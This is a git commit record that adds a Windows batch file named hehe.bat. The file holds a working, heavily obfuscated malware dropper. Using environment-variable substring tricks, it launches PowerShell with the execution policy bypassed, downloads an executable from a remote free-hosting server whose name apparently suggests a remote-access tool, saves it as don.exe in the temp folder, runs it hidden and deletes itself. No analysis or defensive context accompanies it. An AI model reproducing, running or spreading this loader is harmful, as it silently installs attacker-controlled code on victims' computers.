d85f9197628052debb00e948d2068adc0a1ec4f1
bao3125 <104300198+bao3125@users.noreply.github.com>
2024-05-08 21:15:24 +0700

    Add files via upload

---
+++ hehe.bat
@@ -0,0 +1,17 @@
+ÿþ&cls
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+
+%r:~12,1%ode 15,1
+@ec%r:~11,1%o off
+po%r:~9,1%er%r:~8,1%%r:~11,1%ell.exe -ep %r:~10,1%ypa%r:~8,1%%r:~8,1% -Co%r:~12,1%%r:~12,1%and %r:~16,1%nvoke-We%r:~10,1%Req%r:~13,1%e%r:~8,1%%r:~4,1% -Ur%r:~2,1% "%r:~11,1%%r:~4,1%%r:~4,1%p%r:~8,1%://%r:~8,1%erverra%r:~9,1%.000%r:~9,1%e%r:~10,1%%r:~11,1%o%r:~8,1%%r:~4,1%app.co%r:~12,1%/%r:~6,1%" -%r:~17,1%%r:~13,1%%r:~4,1%F%r:~2,1%le "$env:%r:~4,1%e%r:~12,1%p\don.exe"; %r:~14,1%%r:~4,1%ar%r:~4,1%-Proce%r:~8,1%%r:~8,1% -F%r:~2,1%lePa%r:~4,1%%r:~11,1% "$env:%r:~4,1%e%r:~12,1%p\don.exe" -W%r:~2,1%ndo%r:~9,1%%r:~14,1%%r:~4,1%yle %r:~15,1%%r:~2,1%dden
+del %0
+
+@echo off
+set a = %%~i
+%r:~8,1%e%r:~4,1% a = %%%~i
+set a = % + %~i"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
